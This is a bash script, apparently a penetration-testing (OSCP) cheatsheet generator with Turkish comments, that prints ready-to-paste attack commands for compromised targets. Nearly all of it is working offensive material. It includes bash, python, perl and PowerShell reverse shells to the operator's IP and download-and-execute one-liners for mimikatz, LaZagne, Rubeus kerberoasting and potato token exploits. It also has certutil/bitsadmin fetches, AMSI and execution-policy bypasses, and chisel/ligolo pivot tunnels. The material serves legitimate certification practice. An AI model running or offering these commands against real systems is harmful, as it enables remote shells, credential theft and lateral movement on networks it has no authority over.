#!/usr/bin/env bash
# payloads.sh - Generates copy-paste download/exec commands for target machines.
# Usage:
#   ./payloads.sh                # all common payloads (verbose)
#   ./payloads.sh --compact      # one-line-per-tool table (cheatsheet)
#   ./payloads.sh winpeas        # filter to a specific tool (verbose)
#   ./payloads.sh -p 80          # custom port
#   ./payloads.sh -i 10.10.14.5  # custom IP
set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

GREEN=$'\033[0;32m'; YELLOW=$'\033[1;33m'; CYAN=$'\033[0;36m'; BOLD=$'\033[1m'; DIM=$'\033[2m'; NC=$'\033[0m'

PORT="${ARSENAL_PORT:-8000}"
IP="${ARSENAL_IP:-}"
FILTER=""
COMPACT=0

while [ $# -gt 0 ]; do
    case "$1" in
        -p) PORT="$2"; shift 2 ;;
        -i) IP="$2"; shift 2 ;;
        -c|--compact) COMPACT=1; shift ;;
        -h|--help)
            echo "Usage: $0 [-i <ip>] [-p <port>] [-c|--compact] [tool]"
            echo "Tool keywords: linpeas pspy winpeas powerup chisel ligolo nc revshell rubeus sharphound mimikatz kerbrute"
            exit 0 ;;
        *) FILTER="$1"; shift ;;
    esac
done

if [ -z "$IP" ]; then
    IP=$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$IP" ] && IP=$(ip -4 addr show eth0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$IP" ] && IP=$(ifconfig 2>/dev/null | awk '/inet /{print $2}' | grep -v 127.0.0.1 | head -1)
    [ -z "$IP" ] && IP="<TUN0_IP>"
fi

URL="http://$IP:$PORT"
hr() { printf '%.0s-' {1..70}; echo; }
hdr() { echo -e "\n${BOLD}${CYAN}=== $* ===${NC}"; }
sub() { echo -e "${YELLOW}# $*${NC}"; }

# ============================================================
# COMPACT MODE - one line per tool, cheatsheet table
# ============================================================
if [ "$COMPACT" -eq 1 ]; then
    sec() { echo -e "\n${BOLD}${CYAN}--- $* ---${NC}"; }
    row() { printf "${GREEN}%-11s${NC} %s\n" "$1" "$2"; }

    echo -e "${BOLD}OSCP Arsenal${NC}  |  ${GREEN}$URL${NC}  |  LHOST=${GREEN}$IP${NC} LPORT=${GREEN}4444${NC}"

    # =========================================================
    # PHASE 1 - RECON & ENUMERATION
    # =========================================================
    sec "[1] LISTENER  (Kali - shell beklemek icin)"
    row "nc"         "rlwrap nc -lvnp 4444"
    row "pwncat"     "pwncat-cs -lp 4444   ${DIM}# auto TTY upgrade${NC}"
    row "msf"        "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $IP; set LPORT 4444; run'"

    sec "[2] REVERSE SHELL  (hedefte calistir, LHOST=$IP LPORT=4444)"
    row "bash"       "bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1'"
    row "python3"    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    row "perl"       "perl -e 'use Socket;\$i=\"$IP\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    row "ps-tcp"     "iex (iwr $URL/revshells/Invoke-PowerShellTcp.ps1 -UB).Content; Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port 4444"
    row "powercat"   "iex (iwr $URL/revshells/powercat.ps1 -UB).Content; powercat -c $IP -p 4444 -e cmd"
    row "php"        "${DIM}# web target'a yukle:${NC} $URL/revshells/php-reverse-shell.php"
    row "tty-fix"    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  ${DIM}# CTRL+Z; stty raw -echo; fg; export TERM=xterm-256color${NC}"

    # =========================================================
    # PHASE 3 - LINUX ENUM & PRIVESC
    # =========================================================
    sec "[3] LINUX ENUM & PRIVESC  (shell aldiktan sonra)"
    row "linpeas"    "wget $URL/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh"
    row "lse"        "wget $URL/linux/lse.sh -O /tmp/lse && chmod +x /tmp/lse && /tmp/lse -l2"
    row "les"        "wget $URL/linux/linux-exploit-suggester.sh -O /tmp/les && bash /tmp/les"
    row "pspy"       "wget $URL/linux/pspy64 -O /tmp/p && chmod +x /tmp/p && /tmp/p   ${DIM}# cron/proc snoop${NC}"

    # =========================================================
    # PHASE 4 - WINDOWS ENUM & PRIVESC
    # =========================================================
    sec "[4a] WINDOWS ENUM & PRIVESC  (iwr -OutFile, AV yoksa)"
    row "winpeas"    "iwr $URL/windows/winPEASx64.exe -o \$env:TEMP\\wp.exe; & \$env:TEMP\\wp.exe"
    row "privescchk" "iwr $URL/windows/PrivescCheck.ps1 -o \$env:TEMP\\pc.ps1; . \$env:TEMP\\pc.ps1; Invoke-PrivescCheck   ${DIM}# winPEAS'tan hizli ve sessiz${NC}"
    row "powerup"    "iwr $URL/windows/PowerUp.ps1 -o \$env:TEMP\\pu.ps1; . \$env:TEMP\\pu.ps1; Invoke-AllChecks"
    row "sherlock"   "iwr $URL/windows/Sherlock.ps1 -o \$env:TEMP\\sh.ps1; . \$env:TEMP\\sh.ps1; Find-AllVulns"
    row "watson"     "iwr $URL/windows/Watson.ps1 -o \$env:TEMP\\w.ps1; . \$env:TEMP\\w.ps1"
    row "jaws"       "iwr $URL/windows/jaws-enum.ps1 -o \$env:TEMP\\j.ps1; powershell -ep bypass -f \$env:TEMP\\j.ps1"
    row "seatbelt"   "iwr $URL/windows/Seatbelt.exe -o \$env:TEMP\\sb.exe; & \$env:TEMP\\sb.exe -group=all"
    row "accesschk"  "iwr $URL/windows/accesschk64.exe -o \$env:TEMP\\ac.exe; & \$env:TEMP\\ac.exe -uwcqv 'Authenticated Users' *"

    sec "[4b] TOKEN ABUSE  (SeImpersonate/SeAssignPrimaryToken varsa - IIS/MSSQL/web shell'lerinde altin)"
    row "juicypot"   "iwr $URL/windows/JuicyPotato.exe -o \$env:TEMP\\jp.exe; & \$env:TEMP\\jp.exe -t * -p cmd.exe -a '/c whoami' -l 9001   ${DIM}# Win < 1809 (eski sistemler)${NC}"
    row "juicypotng" "iwr $URL/windows/JuicyPotatoNG.exe -o \$env:TEMP\\jpng.exe; & \$env:TEMP\\jpng.exe -t * -p cmd.exe -a '/c whoami'   ${DIM}# Win 1809+ (yeni)${NC}"
    row "printspoof" "iwr $URL/windows/PrintSpoofer64.exe -o \$env:TEMP\\ps.exe; & \$env:TEMP\\ps.exe -i -c cmd   ${DIM}# Win10 1809+ / 2019 (en cok kullanilan)${NC}"
    row "godpotato"  "iwr $URL/windows/GodPotato-NET4.exe -o \$env:TEMP\\gp.exe; & \$env:TEMP\\gp.exe -cmd 'cmd /c whoami'   ${DIM}# PrintSpoofer patch'lendiyse, en yeni${NC}"

    # =========================================================
    # PHASE 5 - ACTIVE DIRECTORY (RECON + ATTACK)
    # =========================================================
    sec "[5a] AD RECON  (domain bilgisi toplama)"
    row "powerview"  "iwr $URL/ad/PowerView.ps1 -o \$env:TEMP\\pv.ps1; . \$env:TEMP\\pv.ps1   ${DIM}# Get-NetUser, Get-NetGroup, Find-LocalAdminAccess${NC}"
    row "sharphound" "iex (iwr $URL/ad/SharpHound.ps1 -UB).Content; Invoke-BloodHound -CollectionMethod All"
    row "adpeas"     "iex (iwr $URL/enum/adPEAS.ps1 -UB).Content; Invoke-adPEAS"
    row "kerbrute"   "/tmp/kb userenum --dc <DC> -d <DOMAIN> users.txt   ${DIM}# wget $URL/ad/kerbrute_linux -O /tmp/kb${NC}"
    row "enum4lin"   "python3 $URL/enum/enum4linux-ng.py -A <target>   ${DIM}# Kali'de calistir${NC}"

    sec "[5b] AD ATTACK  (kerberoast / asreproast / coercion)"
    row "rubeus-kr"  "iwr $URL/ad/Rubeus.exe -o \$env:TEMP\\r.exe; & \$env:TEMP\\r.exe kerberoast /outfile:hashes.txt"
    row "rubeus-as"  "& \$env:TEMP\\r.exe asreproast /format:hashcat /outfile:asrep.txt"
    row "petitpotam" "wget $URL/ad/PetitPotam.py -O /tmp/pp.py && python3 /tmp/pp.py $IP <DC>"
    row "certify"    "iwr $URL/ad/Certify.exe -o \$env:TEMP\\c.exe; & \$env:TEMP\\c.exe find /vulnerable"

    sec "[5c] CREDENTIAL DUMP"
    row "mimikatz"   "iwr $URL/ad/mimikatz_trunk.zip -o m.zip; Expand-Archive m.zip; .\\m\\x64\\mimikatz.exe   ${DIM}# privilege::debug; sekurlsa::logonpasswords${NC}"
    row "safetykatz" "iwr $URL/ad/SafetyKatz.exe -o \$env:TEMP\\sk.exe; & \$env:TEMP\\sk.exe   ${DIM}# Defender'a karsi yumusatilmis mimikatz${NC}"
    row "lazagne-w"  "iwr $URL/ad/LaZagne.exe -o \$env:TEMP\\lz.exe; & \$env:TEMP\\lz.exe all   ${DIM}# browser/wifi/mail/RDP/DB cred'leri${NC}"
    row "lazagne-l"  "wget $URL/linux/lazagne -O /tmp/lz && chmod +x /tmp/lz && /tmp/lz all"
    row "secretsdmp" "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# Kali'de, SAM/NTDS dump${NC}"

    # =========================================================
    # PHASE 6 - LATERAL MOVEMENT / TRANSFER
    # =========================================================
    sec "[6] FILE TRANSFER  (kucuk binary'ler icin)"
    row "nc-win"     "iwr $URL/transfer/nc.exe -o nc.exe; .\\nc.exe -e cmd.exe $IP 4444"
    row "plink"      "iwr $URL/transfer/plink.exe -o plink.exe; .\\plink.exe -ssh -l kali -pw <pw> -R 4444:127.0.0.1:4444 $IP"
    row "socat-lin"  "wget $URL/transfer/socat-linux-x64 -O /tmp/socat && chmod +x /tmp/socat"
    row "smb-share"  "${DIM}# Kali:${NC} impacket-smbserver share \$PWD -smb2support   ${DIM}# Hedef:${NC} copy \\\\$IP\\share\\file.exe"

    # =========================================================
    # PHASE 7 - PIVOTING / TUNNEL (i kinci network'a)
    # =========================================================
    sec "[7] PIVOT / TUNNEL  (ic agda devam etmek icin)"
    row "chisel-srv" "${DIM}# Kali:${NC} ./tools/transfer/chisel-linux server -p 4444 --reverse"
    row "chisel-lin" "wget $URL/transfer/chisel-linux -O /tmp/c && chmod +x /tmp/c && /tmp/c client $IP:4444 R:1080:socks"
    row "chisel-win" "iwr $URL/transfer/chisel-windows.exe -o c.exe; .\\c.exe client $IP:4444 R:1080:socks"
    row "ligolo-srv" "${DIM}# Kali:${NC} sudo ip tuntap add user \$USER mode tun ligolo && sudo ip link set ligolo up && ./tools/transfer/ligolo-proxy -selfcert"
    row "ligolo-lin" "wget $URL/transfer/ligolo-agent-linux -O /tmp/lagent && chmod +x /tmp/lagent && /tmp/lagent -connect $IP:11601 -ignore-cert"
    row "ligolo-win" "iwr $URL/transfer/ligolo-agent-windows.exe -o la.exe; .\\la.exe -connect $IP:11601 -ignore-cert"
    row "proxychns"  "${DIM}# /etc/proxychains4.conf'a:${NC} socks5 127.0.0.1 1080  ${DIM}# Kullanim:${NC} proxychains nmap -sT <hedef>"

    # =========================================================
    # FALLBACK PATTERNS - "X tool calismadi" durumlari
    # =========================================================
    sec "[F] FALLBACK PATTERNS  (yukaridaki komut takilirsa donusumler)"
    echo -e "${DIM}  iwr -o blocked    →  iex (iwr URL -UB).Content                  (in-memory, disk yok)${NC}"
    echo -e "${DIM}  PowerShell yok    →  certutil -urlcache -split -f URL out.exe   (cmd.exe ile)${NC}"
    echo -e "${DIM}  certutil yok      →  bitsadmin /transfer N URL out.exe          (eski Windows)${NC}"
    echo -e "${DIM}  AMSI takiliyor    →  ./amsi_b64.sh \"iex (iwr URL -UB).Content\"  (base64+bypass)${NC}"
    echo -e "${DIM}  ExecutionPolicy   →  powershell -ep bypass -f file.ps1${NC}"
    echo -e "${DIM}  ConstrainedLang   →  exe kullan, ps1 unut (Rubeus/Seatbelt/Sharphound .exe)${NC}"

    echo
    echo -e "${YELLOW}Detay:${NC}  ${GREEN}./payloads.sh <tool>${NC}    ${YELLOW}AMSI bypass:${NC}  ${GREEN}./amsi_b64.sh '<cmd>'${NC}    ${YELLOW}msfvenom:${NC}  ${GREEN}./msfgen.sh windows 4444${NC}"
    exit 0
fi
# ============================================================
# VERBOSE MODE (default) - sectioned with all alternatives
# ============================================================

section() {
    local key="$1" title="$2"; shift 2
    if [ -z "$FILTER" ] || echo "$key" | grep -qi "$FILTER"; then
        hdr "$title"
        echo "$@"
    fi
}

echo -e "${BOLD}OSCP Payload Helper${NC}  |  ${GREEN}$URL${NC}\n"

# ---------- LINUX ----------
section "linpeas" "LINUX - linPEAS (privesc)" "$(cat <<EOF
$(sub "wget")
wget $URL/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

$(sub "curl")
curl -sL $URL/linux/linpeas.sh | bash

$(sub "diskless (memory only)")
curl -sL $URL/linux/linpeas.sh | sh
EOF
)"

section "pspy" "LINUX - pspy64 (proc snooper)" "$(cat <<EOF
wget $URL/linux/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
EOF
)"

section "lse" "LINUX - lse.sh (smart enum)" "$(cat <<EOF
wget $URL/linux/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh && /tmp/lse.sh -l1
EOF
)"

section "les" "LINUX - linux-exploit-suggester" "$(cat <<EOF
wget $URL/linux/linux-exploit-suggester.sh -O /tmp/les.sh && chmod +x /tmp/les.sh && /tmp/les.sh
EOF
)"

section "socat" "LINUX - socat static binary" "$(cat <<EOF
wget $URL/transfer/socat-linux-x64 -O /tmp/socat && chmod +x /tmp/socat
# Reverse-shell relay:  /tmp/socat TCP-LISTEN:4444,reuseaddr,fork TCP:$IP:$PORT
EOF
)"

# ---------- WINDOWS ----------
section "winpeas" "WINDOWS - winPEAS" "$(cat <<EOF
$(sub "PowerShell IWR (.exe)")
iwr $URL/windows/winPEASx64.exe -o \$env:TEMP\winpeas.exe; & \$env:TEMP\winpeas.exe

$(sub "PowerShell .ps1 in-memory (no AMSI)")
iex (iwr $URL/windows/winPEAS.ps1 -UseBasicParsing).Content

$(sub "certutil")
certutil -urlcache -split -f $URL/windows/winPEASx64.exe winpeas.exe & winpeas.exe

$(sub "bitsadmin")
bitsadmin /transfer wp /priority high $URL/windows/winPEASx64.exe %TEMP%\wp.exe & %TEMP%\wp.exe

$(sub "batch version")
certutil -urlcache -split -f $URL/windows/winPEAS.bat wp.bat & wp.bat
EOF
)"

section "powerup" "WINDOWS - PowerUp.ps1" "$(cat <<EOF
iex (iwr $URL/windows/PowerUp.ps1 -UseBasicParsing).Content; Invoke-AllChecks
EOF
)"

section "sherlock" "WINDOWS - Sherlock.ps1" "$(cat <<EOF
iex (iwr $URL/windows/Sherlock.ps1 -UseBasicParsing).Content; Find-AllVulns
EOF
)"

section "watson" "WINDOWS - Watson.ps1" "$(cat <<EOF
iex (iwr $URL/windows/Watson.ps1 -UseBasicParsing).Content
EOF
)"

section "jaws" "WINDOWS - JAWS" "$(cat <<EOF
iwr $URL/windows/jaws-enum.ps1 -o \$env:TEMP\j.ps1; powershell -ep bypass -f \$env:TEMP\j.ps1
EOF
)"

section "seatbelt" "WINDOWS - Seatbelt.exe" "$(cat <<EOF
iwr $URL/windows/Seatbelt.exe -o \$env:TEMP\sb.exe; & \$env:TEMP\sb.exe -group=all
EOF
)"

section "accesschk" "WINDOWS - AccessChk" "$(cat <<EOF
iwr $URL/windows/accesschk64.exe -o \$env:TEMP\ac.exe; & \$env:TEMP\ac.exe -uwcqv "Authenticated Users" *
EOF
)"

section "nc" "WINDOWS - netcat (nc.exe)" "$(cat <<EOF
$(sub "download")
certutil -urlcache -split -f $URL/transfer/nc.exe nc.exe
$(sub "reverse shell")
nc.exe -e cmd.exe $IP 4444
EOF
)"

section "plink" "WINDOWS - plink (SSH)" "$(cat <<EOF
certutil -urlcache -split -f $URL/transfer/plink.exe plink.exe
# Reverse SSH tunnel: plink.exe -ssh -l kali -pw <pw> -R 4444:127.0.0.1:4444 $IP
EOF
)"

# ---------- AD ----------
section "powerview" "AD - PowerView.ps1" "$(cat <<EOF
iex (iwr $URL/ad/PowerView.ps1 -UseBasicParsing).Content
# Then: Get-NetUser, Get-NetGroup, Get-NetComputer, Find-LocalAdminAccess
EOF
)"

section "rubeus" "AD - Rubeus.exe" "$(cat <<EOF
iwr $URL/ad/Rubeus.exe -o \$env:TEMP\r.exe
& \$env:TEMP\r.exe kerberoast /outfile:hashes.txt
& \$env:TEMP\r.exe asreproast /format:hashcat
EOF
)"

section "sharphound" "AD - SharpHound" "$(cat <<EOF
$(sub "ps1 (in-memory)")
iex (iwr $URL/ad/SharpHound.ps1 -UseBasicParsing).Content; Invoke-BloodHound -CollectionMethod All
$(sub "exe (download zip)")
iwr $URL/ad/SharpHound.zip -o sh.zip; Expand-Archive sh.zip; .\sh\SharpHound.exe -c All
EOF
)"

section "mimikatz" "AD - mimikatz" "$(cat <<EOF
iwr $URL/ad/mimikatz_trunk.zip -o \$env:TEMP\m.zip
Expand-Archive \$env:TEMP\m.zip -DestinationPath \$env:TEMP\m
& \$env:TEMP\m\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
EOF
)"

section "kerbrute" "AD - kerbrute" "$(cat <<EOF
$(sub "linux")
wget $URL/ad/kerbrute_linux -O /tmp/kb && chmod +x /tmp/kb
/tmp/kb userenum --dc <DC_IP> -d <DOMAIN> users.txt
EOF
)"

# ---------- TUNNELING ----------
section "chisel" "TUNNEL - chisel (reverse SOCKS)" "$(cat <<EOF
$(sub "Kali (server)")
./tools/transfer/chisel-linux server -p 4444 --reverse

$(sub "Target Linux")
wget $URL/transfer/chisel-linux -O /tmp/c && chmod +x /tmp/c
/tmp/c client $IP:4444 R:1080:socks

$(sub "Target Windows")
iwr $URL/transfer/chisel-windows.exe -o \$env:TEMP\c.exe
& \$env:TEMP\c.exe client $IP:4444 R:1080:socks
EOF
)"

section "ligolo" "TUNNEL - ligolo-ng" "$(cat <<EOF
$(sub "Kali side")
sudo ip tuntap add user \$USER mode tun ligolo
sudo ip link set ligolo up
tar xzf tools/transfer/ligolo-proxy-linux.tar.gz -C /tmp/
/tmp/proxy -selfcert

$(sub "Target Linux agent")
wget $URL/transfer/ligolo-agent-linux.tar.gz -O /tmp/la.tgz
tar xzf /tmp/la.tgz -C /tmp/ && /tmp/agent -connect $IP:11601 -ignore-cert

$(sub "Target Windows agent")
iwr $URL/transfer/ligolo-agent-windows.zip -o \$env:TEMP\la.zip
Expand-Archive \$env:TEMP\la.zip -DestinationPath \$env:TEMP\la
& \$env:TEMP\la\agent.exe -connect $IP:11601 -ignore-cert
EOF
)"

# ---------- REV SHELLS ----------
section "revshell" "REV-SHELL - bash/python/php oneliners" "$(cat <<EOF
$(sub "bash")
bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1'

$(sub "python3")
python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'

$(sub "perl")
perl -e 'use Socket;\$i=\"$IP\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'

$(sub "powershell (Nishang Invoke-PowerShellTcp)")
iex (iwr $URL/revshells/Invoke-PowerShellTcp.ps1 -UseBasicParsing).Content
Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port 4444

$(sub "powercat")
iex (iwr $URL/revshells/powercat.ps1 -UseBasicParsing).Content; powercat -c $IP -p 4444 -e cmd

$(sub "PHP webshell")
# Upload to target: $URL/revshells/php-reverse-shell.php
EOF
)"

# ---------- PTY UPGRADE ----------
section "pty" "TTY UPGRADE (after catching shell)" "$(cat <<EOF
$(sub "Full interactive TTY")
python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL+Z, then on Kali:
stty raw -echo; fg
# Then on target:
export TERM=xterm-256color; stty rows 50 cols 200
EOF
)"

# ---------- LISTENERS ----------
section "listener" "LISTENERS (Kali side)" "$(cat <<EOF
$(sub "nc")
nc -lvnp 4444

$(sub "rlwrap (history+arrows)")
rlwrap nc -lvnp 4444

$(sub "pwncat-cs (auto upgrade)")
pwncat-cs -lp 4444
EOF
)"

if [ -z "$FILTER" ]; then
    echo
    hr
    echo -e "${YELLOW}Tip:${NC} single tool        ${GREEN}./payloads.sh winpeas${NC}"
    echo -e "${YELLOW}Tip:${NC} AMSI bypass + b64  ${GREEN}./amsi_b64.sh '<command>'${NC}"
    echo -e "${YELLOW}Tip:${NC} msfvenom payload   ${GREEN}./msfgen.sh windows 4444${NC}"
fi
